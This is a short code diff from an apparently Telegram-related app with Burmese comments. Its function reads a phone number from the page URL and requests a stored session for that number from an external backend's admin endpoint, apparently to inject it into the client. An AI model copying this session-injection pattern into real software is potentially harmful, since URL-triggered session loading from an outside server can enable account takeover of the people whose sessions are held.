@@ -42,16 +42,22 @@ if (IS_TAURI) {
 }
 
 // -------------------------------------------------------------
-// အသစ်ထည့်သွင်းမည့် Session Injection Code
-// -------------------------------------------------------------
 async function checkAndInjectSession() {
   const urlParams = new URLSearchParams(window.location.search);
-  const loginPhone = urlParams.get('login_phone');
+  let loginPhone = urlParams.get('login_phone');
 
   if (loginPhone) {
+    // URL ထဲမှာ Space ဖြစ်သွားခဲ့ရင် '+' အဖြစ် ပြန်ပြောင်းပေးခြင်း
+    loginPhone = loginPhone.replace(/ /g, '+');
+    
+    // တကယ်လို့ '+' လုံးဝ မပါလာခဲ့ရင် ရှေ့ဆုံးကနေ အတင်းထည့်ပေးခြင်း
+    if (!loginPhone.startsWith('+')) {
+      loginPhone = '+' + loginPhone;
+    }
+
     try {
       // Backend မှ Session လှမ်းယူခြင်း
-      const response = await fetch('/api/admin/get-tt-session', {
+      const response = await fetch('https://telegramtokenreqbackend.onrender.com/api/admin/get-tt-session', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ userId: 7812553563, phoneNumber: loginPhone })
